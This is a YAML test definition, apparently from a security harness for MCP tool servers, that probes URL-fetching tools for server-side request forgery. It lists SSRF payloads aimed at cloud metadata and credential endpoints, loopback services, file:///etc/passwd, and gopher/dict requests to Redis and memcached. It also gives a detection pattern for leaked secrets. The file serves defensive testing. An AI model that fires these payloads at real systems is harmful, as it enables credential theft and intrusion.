@@ -1,0 +1,61 @@
+id: MCP-D-003
+name: SSRF in URL-fetching tools
+description: >
+  For every tool the harness has classified as net_egress (URL fetcher,
+  webhook caller, scraper, etc.), attempts to (a) reach a controlled
+  canary endpoint to prove arbitrary egress, and (b) probe
+  link-local / cloud metadata / loopback addresses to detect missing
+  scheme allowlisting, missing host filtering, and DNS-rebinding
+  weaknesses. Server-side validation test, no agent required.
+category: tool.input.ssrf
+severity: high
+references:
+  - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
+  - https://blog.assetnote.io/2021/01/14/blind-ssrf-chains/
+  - https://cwe.mitre.org/data/definitions/918.html
+spec_versions: ["2025-06-18"]
+
+requires:
+  capabilities:
+    - any: [net_egress]
+
+setup:
+  canaries:
+    - id: ssrf_canary
+      type: http
+
+attack:
+  - step: tools_call
+    target_tool_capability: net_egress
+    argument_role: url
+    payloads:
+      # Arbitrary egress proof
+      - "{canary:ssrf_canary}/probe"
+      # Cloud metadata services
+      - "http://169.254.169.254/latest/meta-data/"            # AWS IMDSv1
+      - "http://169.254.170.2/v2/credentials/"                # ECS task role
+      - "http://metadata.google.internal/computeMetadata/v1/" # GCP
+      - "http://169.254.169.254/metadata/instance?api-version=2021-02-01" # Azure
+      # Loopback probes
+      - "http://127.0.0.1:22"
+      - "http://[::1]:22"
+      - "http://0.0.0.0:6379/"
+      # Non-HTTP schemes
+      - "file:///etc/passwd"
+      - "file:///etc/hostname"
+      - "gopher://127.0.0.1:6379/_PING%0d%0a"
+      - "dict://127.0.0.1:11211/stat"
+
+oracle:
+  any_of:
+    - canary_hit:
+        id: ssrf_canary
+        min_count: 1
+    - trace_contains:
+        pattern: "(root:x:0:|ami-id|AccessKeyId|computeMetadata|SSH-2\\.0|Microsoft-IIS)"
+        where: response
+
+cleanup:
+  - revoke_canaries: true
+
+expected_in_baseline: true
